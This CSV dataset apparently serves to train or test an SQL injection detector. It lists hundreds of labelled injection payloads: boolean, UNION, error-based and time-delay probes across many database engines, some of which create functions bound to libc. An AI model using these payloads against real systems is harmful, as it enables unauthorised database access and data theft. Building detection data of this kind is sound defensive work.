payload,length,label
"1"") where 2445=2445;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",111,SQL_INJECTION
"1"") where 4905=4905 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",127,SQL_INJECTION
-9742) where 8409=8409 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,210,SQL_INJECTION
"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",74,SQL_INJECTION
"1'||(select 'pvmz' from dual where 1090=1090 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1))||'",178,SQL_INJECTION
-2100' where 9260=9260 or 3038=3038,35,SQL_INJECTION
"1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and 'egye'='egye",127,SQL_INJECTION
"1%')));select * from generate_series(5206,5206,case when (5206=2214) then 1 else 0 end) limit 1--",97,SQL_INJECTION
1'||(select 'allj' where 7334=7334;begin dbms_lock.sleep(5); end)||',68,SQL_INJECTION
-4523 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),207,SQL_INJECTION
"1%' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and '%'='",164,SQL_INJECTION
"1"" where 8234=8234;select (case when (4291=6937) then 4291 else 4291*(select 4291 from mysql.db) end)#",102,SQL_INJECTION
"1'+(select 'ncny' where 5634=5634;select like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",95,SQL_INJECTION
"1' where 8837=8837 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",117,SQL_INJECTION
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('ekqv'='ekqv",95,SQL_INJECTION
1'+(select aqhj where 4419=4419;waitfor delay '0:0:5'--,55,SQL_INJECTION
"1"" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""ctdc""=""ctdc",112,SQL_INJECTION
"-9829'))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",140,SQL_INJECTION
"1') where 8125=8125 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",217,SQL_INJECTION
"1"");select (case when (4415=2051) then 4415 else cast(1 as int)/(select 0 from dual) end) from dual--",101,SQL_INJECTION
"1"") as qjyu where 2679=2679 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",135,SQL_INJECTION
"1'+(select 'utlx' where 6256=6256 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)))+'",125,SQL_INJECTION
"-2745') or elt(1032=1032,3623) and ('vfxq'='vfxq",48,SQL_INJECTION
"1 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)# cqqs",177,SQL_INJECTION
1')) as qpai where 2619=2619;(select * from (select(sleep(5)))acdk)#,68,SQL_INJECTION
"1"";select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ""ulfr"" like ""ulfr",106,SQL_INJECTION
"1'+(select 'jhce' where 1117=1117 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",133,SQL_INJECTION
"1')));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((('xmwj'='xmwj",107,SQL_INJECTION
"1%"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ""%""=""",107,SQL_INJECTION
"1"")) as dcrk where 5164=5164 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",181,SQL_INJECTION
"-9133"")) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""crfy""=""crfy",229,SQL_INJECTION
"1"";iif(2084=5671,1,1/0)",23,SQL_INJECTION
1';begin dbms_lock.sleep(5); end and 'aenf'='aenf,49,SQL_INJECTION
"-8629 where 8049=8049 union all select 8049,8049,8049,8049,8049,8049,8049#",74,SQL_INJECTION
"-8491"" where 6107=6107 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",222,SQL_INJECTION
"elt(8192=8192,sleep(5))",23,SQL_INJECTION
1%';select case when 7717=7717 then 1 else null end--,53,SQL_INJECTION
"1 where 3799=3799 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",125,SQL_INJECTION
"-2951"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))",204,SQL_INJECTION
"make_set(8734=8734,sleep(5))",28,SQL_INJECTION
"-8566"") as hnch where 3418=3418 union all select 3418,3418,3418,3418,3418,3418,3418#",84,SQL_INJECTION
"1))) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",100,SQL_INJECTION
"1""))) union all select null,null,null,null,null,null,null#",58,SQL_INJECTION
"-8042) as zhoq where 2120=2120 union all select 2120,2120,2120,2120,2120,2120,2120,2120,2120,2120--",99,SQL_INJECTION
"1')) and 8407=(select count(*) from generate_series(1,5000000)) and (('dfsj'='dfsj",82,SQL_INJECTION
"1"")));select benchmark(5000000,md5(0x714e4153))#",48,SQL_INJECTION
"1"" where 8697=8697 and elt(3114=3114,sleep(5))#",47,SQL_INJECTION
"1"");select (case when (6839=2730) then 6839 else 6839*(select 6839 from mysql.db) end)#",87,SQL_INJECTION
"1"" where 3247=3247 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",116,SQL_INJECTION
-4562') or 3038=3038,20,SQL_INJECTION
1) rlike sleep(5) and (5724=5724,32,SQL_INJECTION
"1"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""qblj"" like ""qblj",177,SQL_INJECTION
"1') as omtb where 1183=1183 and 8635=(select count(*) from generate_series(1,5000000))--",88,SQL_INJECTION
1 where 2649=2649 or (select * from (select(sleep(5)))ydpu)--,61,SQL_INJECTION
"1%""))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""",113,SQL_INJECTION
"1)) as spdf where 8554=8554 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",103,SQL_INJECTION
"1 union all select null,null,null,null,null,null#",49,SQL_INJECTION
"1,(select * from generate_series(9108,9108,case when (9108=2900) then 1 else 0 end) limit 1)",92,SQL_INJECTION
"1"";begin dbms_lock.sleep(5); end--",34,SQL_INJECTION
"1%"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""%""=""",164,SQL_INJECTION
"1"") where 6632=6632 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",95,SQL_INJECTION
"1') as xagu where 9088=9088 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",227,SQL_INJECTION
"1"") as dlfq where 8410=8410;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",95,SQL_INJECTION
"1')) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",103,SQL_INJECTION
"-9408%"")) union all select 1841,1841,1841,1841,1841,1841--",58,SQL_INJECTION
"-1134"" union all select 4865,4865,4865,4865,4865#",49,SQL_INJECTION
"1%"") and 8635=(select count(*) from generate_series(1,5000000))--",65,SQL_INJECTION
"-4373'+(select 'rlht' where 2285=2285 union all select 2285,2285,2285#",70,SQL_INJECTION
"1'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('ckfn' like 'ckfn",90,SQL_INJECTION
1') as lewd where 3118=3118 order by 1--,40,SQL_INJECTION
"-7808"")) as jgkk where 9230=9230 or elt(1032=1032,3623)--",57,SQL_INJECTION
"1')) as bbdf where 1327=1327;iif(8354=3515,1,1/0)",49,SQL_INJECTION
"1 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)-- kfqs",83,SQL_INJECTION
"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--",70,SQL_INJECTION
"-7514%""))) or 2448=8797#",24,SQL_INJECTION
1 or (select * from (select(sleep(5)))ydpu)-- paxv,50,SQL_INJECTION
"1' where 9222=9222 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",121,SQL_INJECTION
1) where 1120=1120;select (case when (3716=4021) then 3716 else 3716*(select 3716 from information_schema.character_sets) end)#,127,SQL_INJECTION
"1""))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""urgd""=""urgd",221,SQL_INJECTION
"1%' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and '%'='",103,SQL_INJECTION
"1)) as ambt where 5198=5198 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",137,SQL_INJECTION
"1"";waitfor delay '0:0:5'",24,SQL_INJECTION
"1' and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",110,SQL_INJECTION
"1' where 1230=1230 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",156,SQL_INJECTION
"-1653 union all select 8415,8415,8415,8415,8415,8415,8415,8415#",63,SQL_INJECTION
1'+(select gqez where 3704=3704;select (case when (9030=6952) then 1 else 9030*(select 9030 from master..sysdatabases) end)--,125,SQL_INJECTION
"-3733')) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('ybgd'='ybgd",222,SQL_INJECTION
1';begin user_lock.sleep(5); end and 'blit'='blit,49,SQL_INJECTION
"1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))# fmxq",97,SQL_INJECTION
"1'||(select 'qwoo' from dual where 8802=8802 or elt(6272=6272,sleep(5)))||'",75,SQL_INJECTION
(select (case when (1570=6977) then 1 else 1570*(select 1570 from mysql.db) end)),81,SQL_INJECTION
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",107,SQL_INJECTION
1%'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'=',222,SQL_INJECTION
"1"" or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",109,SQL_INJECTION
"1')) as usrk where 6324=6324 union all select null,null,null,null,null,null,null,null,null,null--",97,SQL_INJECTION
1'||(select 'etvo' from dual where 1557=1557;(select * from (select(sleep(5)))acdk)#,84,SQL_INJECTION
"1'||(select 'flre' where 8250=8250 or 8421=(select count(*) from generate_series(1,5000000)))||'",96,SQL_INJECTION
"-5903%""))) or 3038=3038",23,SQL_INJECTION
"1') or 8514=benchmark(5000000,md5(0x544d5a4c))#",47,SQL_INJECTION
"1%"" union all select null,null,null,null,null,null,null,null--",62,SQL_INJECTION
-6722') order by 1#,19,SQL_INJECTION
"1"")));select (case when (4774=1535) then 4774 else cast(1 as int)/(select 0 from dual) end) from dual--",103,SQL_INJECTION
"1' in boolean mode);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",110,SQL_INJECTION
"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",56,SQL_INJECTION
1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('ltki'='ltki,83,SQL_INJECTION
"1"" union all select null,null,null,null,null,null,null,null,null,null#",70,SQL_INJECTION
"1"")) as oiqr where 4073=4073 or 8156=(select count(*) from generate_series(1,5000000))--",88,SQL_INJECTION
"1%"" and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""%""=""",110,SQL_INJECTION
"1"" where 4064=4064 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",216,SQL_INJECTION
"-4373%"")) or 5672=5188--",24,SQL_INJECTION
"1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'ebuo'='ebuo",169,SQL_INJECTION
"-6073""))) or 9502=2012#",23,SQL_INJECTION
"1"")));begin dbms_lock.sleep(5); end and (((""zpii"" like ""zpii",60,SQL_INJECTION
"1"") where 9861=9861;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",136,SQL_INJECTION
"1'+(select 'otqy' where 2754=2754 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))+'",127,SQL_INJECTION
"1"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",122,SQL_INJECTION
"1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('wnzv'='wnzv",155,SQL_INJECTION
-7775 or 8571=8571--,20,SQL_INJECTION
1 and 6969=(select 6969 from pg_sleep(5))# pkcp,47,SQL_INJECTION
1'||(select 'cgup' from dual where 5383=5383 waitfor delay '0:0:5'--,68,SQL_INJECTION
"1) and elt(3138=1817,1817)",26,SQL_INJECTION
"1';create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and 'hhrw' like 'hhrw",139,SQL_INJECTION
1' and sleep(5) and 'usgv' like 'usgv,37,SQL_INJECTION
"1"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",106,SQL_INJECTION
1)));select (case when (3336=9781) then 3336 else 1/(select 0) end)--,69,SQL_INJECTION
-5967 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)# lhoh,197,SQL_INJECTION
"1"" or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",100,SQL_INJECTION
"-3209'+(select ldum where 9912=9912 union all select 9912,9912,9912,9912#",73,SQL_INJECTION
"1""));select sleep(5)#",21,SQL_INJECTION
-3582') or 6872=6872 and ('gyfj'='gyfj,38,SQL_INJECTION
(select chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7812=7812) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113) from dual),179,SQL_INJECTION
"1)) as potk where 5040=5040 or elt(5873=5873,sleep(5))#",55,SQL_INJECTION
"1""))) and (select * from (select(sleep(5)))fzno) and (((""uncg""=""uncg",68,SQL_INJECTION
"1"")) as hzcq where 9250=9250 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",229,SQL_INJECTION
"1%"")) waitfor delay '0:0:5' and ((""%""=""",39,SQL_INJECTION
"1'+(select lhho where 7579=7579 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",139,SQL_INJECTION
"1%'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('%'='",149,SQL_INJECTION
-7999) or 8422=1336,19,SQL_INJECTION
"-9156')) union all select 9110,9110,9110,9110#",46,SQL_INJECTION
1') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('vhqm'='vhqm,115,SQL_INJECTION
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((('clhg'='clhg",120,SQL_INJECTION
"-6754') where 8388=8388 union all select 8388,8388,8388,8388,8388--",67,SQL_INJECTION
"1%"")));select pg_sleep(5)--",27,SQL_INJECTION
"1')) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (('wgpg' like 'wgpg",117,SQL_INJECTION
"1"" where 2483=2483;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",127,SQL_INJECTION
1'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('pneh' like 'pneh,233,SQL_INJECTION
"1'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('zovb' like 'zovb",91,SQL_INJECTION
"1') as xvcr where 6456=6456 and 3824=benchmark(5000000,md5(0x76555642))--",73,SQL_INJECTION
"1'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('iaud'='iaud",130,SQL_INJECTION
"1%"") and 8715=5529",18,SQL_INJECTION
"-3234%"")) or elt(1032=1032,3623) and ((""%""=""",44,SQL_INJECTION
1')) as sjzf where 9997=9997 and 4193=5408,42,SQL_INJECTION
1')) as dckd where 1794=1794;select (case when (2914=3335) then 2914 else cast(1 as int)/(select 0 from dual) end) from dual--,126,SQL_INJECTION
-5369') or 3208=6669#,21,SQL_INJECTION
1%'));select sleep(5) and (('%'=',33,SQL_INJECTION
"-6475""))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""mdsx"" like ""mdsx",265,SQL_INJECTION
"1',(select (case when (1392=1380) then 1 else 1392*(select 1392 from master..sysdatabases) end))",96,SQL_INJECTION
"1 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",154,SQL_INJECTION
"1"")) as ynuw where 9138=9138;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",112,SQL_INJECTION
1) rlike (select (case when (7689=7689) then 1 else 0x28 end)),62,SQL_INJECTION
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4# ljph",102,SQL_INJECTION
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('xcxr' like 'xcxr",70,SQL_INJECTION
"1') or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",108,SQL_INJECTION
"1 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",106,SQL_INJECTION
"1"") and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",79,SQL_INJECTION
1%'))) and (3020=3020)*6703 and ((('%'=',40,SQL_INJECTION
1 or 6793=(select 6793 from pg_sleep(5))# awpq,46,SQL_INJECTION
"1' where 4358=4358 union all select null,null,null,null--",57,SQL_INJECTION
-3821') or 9323=9323#,21,SQL_INJECTION
"1%') and elt(4249=4249,7259) and ('%'='",39,SQL_INJECTION
-4323')) or 6968=1393,21,SQL_INJECTION
"1%""));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",73,SQL_INJECTION
"1%""));begin user_lock.sleep(5); end--",37,SQL_INJECTION
-4137)) as elxu where 5672=5672 order by 1--,44,SQL_INJECTION
"1' where 2964=2964 union all select null,null,null#",51,SQL_INJECTION
"1' in boolean mode) and elt(1210=1210,sleep(5))#",48,SQL_INJECTION
1%' or (select * from (select(sleep(5)))ydpu) and '%'=',55,SQL_INJECTION
"1"" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ""cgpm"" like ""cgpm",225,SQL_INJECTION
"1"")) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",107,SQL_INJECTION
1')) waitfor delay '0:0:5' and (('bbqk'='bbqk,45,SQL_INJECTION
"1'||(select 'rttq' from dual where 7368=7368 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))||'",139,SQL_INJECTION
"1%' union all select null,null--",32,SQL_INJECTION
1' where 1017=1017 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,223,SQL_INJECTION
(1589=1589)*1,13,SQL_INJECTION
-9541 where 4291=4291 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,203,SQL_INJECTION
"1) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",92,SQL_INJECTION
"1)) and 8635=(select count(*) from generate_series(1,5000000))--",64,SQL_INJECTION
1) and 7533=7533 and (7175=7175,31,SQL_INJECTION
-7786')) or 9323=9323#,22,SQL_INJECTION
-6665'))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((('winx'='winx,260,SQL_INJECTION
-6086')) or (6719=7280)*7280 and (('ozbj'='ozbj,47,SQL_INJECTION
"1"" where 1452=1452 union all select null,null,null,null--",57,SQL_INJECTION
1'||(select 'wadx' where 4287=4287 or sleep(5)#,47,SQL_INJECTION
-4542')) order by 1#,20,SQL_INJECTION
"-9978"" or make_set(4893=9765,9765) and ""mhjt""=""mhjt",51,SQL_INJECTION
"1"" where 2221=2221 and 5318=8398--",34,SQL_INJECTION
"1' in boolean mode) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",110,SQL_INJECTION
"1'||(select 'jbgg' from dual where 1986=1986 union all select null,null,null,null,null,null,null,null,null,null#",112,SQL_INJECTION
"1%"";select pg_sleep(5) and ""%""=""",32,SQL_INJECTION
"1%"") or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (""%""=""",185,SQL_INJECTION
"1"") where 9285=9285 and 8506=8343#",34,SQL_INJECTION
"1"" and (3020=3020)*6703",23,SQL_INJECTION
"1"") union all select null,null,null,null,null,null,null,null--",62,SQL_INJECTION
"1'))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('yiem'='yiem",195,SQL_INJECTION
"1"")) and 6969=(select 6969 from pg_sleep(5)) and ((""cowu"" like ""cowu",68,SQL_INJECTION
"-6618""))) order by 1#",21,SQL_INJECTION
"1"") where 4822=4822 union all select null,null,null,null,null,null,null,null,null,null--",88,SQL_INJECTION
1') and 2305=1934,17,SQL_INJECTION
1'+(select hett where 7228=7228;waitfor delay '0:0:5')+',56,SQL_INJECTION
1%')));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,100,SQL_INJECTION
1');select pg_sleep(5) and ('vnss' like 'vnss,45,SQL_INJECTION
"1%"")));select (case when (5290=1720) then 5290 else 1/(select 0) end)--",71,SQL_INJECTION
"1"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",94,SQL_INJECTION
"1"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""dskh""=""dskh",120,SQL_INJECTION
"1'+(select dklk where 9862=9862 union all select null,null,null,null,null,null--",80,SQL_INJECTION
"1')) as fcjk where 7755=7755;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",112,SQL_INJECTION
"-2782')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",139,SQL_INJECTION
"1))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((7813=7813",151,SQL_INJECTION
"1%' union all select null,null,null,null#",41,SQL_INJECTION
"1"") where 3958=3958 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",81,SQL_INJECTION
"-2701"")) as wvht where 5401=5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",90,SQL_INJECTION
"1%""))) or 8421=(select count(*) from generate_series(1,5000000)) and (((""%""=""",77,SQL_INJECTION
"1))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((4744=4744",127,SQL_INJECTION
"1'||(select 'ojdz' where 7350=7350 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))||'",189,SQL_INJECTION
"1' where 6147=6147 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",218,SQL_INJECTION
1') and sleep(5),16,SQL_INJECTION
1%');select (case when (3773=3722) then 3773 else 3773*(select 3773 from mysql.db) end)#,88,SQL_INJECTION
1'));begin user_lock.sleep(5); end and (('vcaf' like 'vcaf,58,SQL_INJECTION
"1"") union all select null,null,null,null#",41,SQL_INJECTION
